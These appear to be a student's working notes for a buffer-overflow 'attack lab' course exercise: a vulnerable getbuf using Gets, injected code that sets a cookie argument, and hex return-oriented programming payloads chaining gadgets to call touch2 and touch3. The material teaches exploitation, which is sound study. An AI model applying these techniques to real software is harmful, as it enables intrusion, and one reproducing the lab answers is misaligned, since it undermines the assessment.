
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

void test() 
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val); // 401976
}

void touch2(unsigned val) // val should be equal to cookie
// 0x00000000004017ec

cookie: 0x59b997fa
35 39 62 39 39 37 66 61


movq $0x59b997fa, %rdi		
push $0x4017ec				
ret	


popq %xxx // 58
movq %xxx, %rdi // 48 89 c7

58 90 c3 // pop to rax, nop, ret
48 89 c7 90 c3 // rax to rdi, nop, ret



00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

void touch3(char *sval) // 0x00000000004018fa

popq %xxx // 
movq %xxx, %rdi // 

rsp->rax->rdi
pop 40 rax->rdx->rcx->rsi
x+y->rax
rax->rdi

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00 // rsp->rax, nop, ret
c5 19 40 00 00 00 00 00 // rax->rdi, nop, ret
cc 19 40 00 00 00 00 00 // pop rax, nop, ret
48 00 00 00 00 00 00 00 // a number to be popped, 0x48
dd 19 40 00 00 00 00 00 // rax->rdx, nop, ret
34 1a 40 00 00 00 00 00 // rdx->rcx, nop2, ret
27 1a 40 00 00 00 00 00 // rcx->rsi, nop2, ret
d6 19 40 00 00 00 00 00 // rdi+rsi->rax, ret
c5 19 40 00 00 00 00 00 // rax->rdi, nop, ret 
fa 18 40 00 00 00 00 00 // entry for touch3
35 39 62 39 39 37 66 61 // string of cookie




































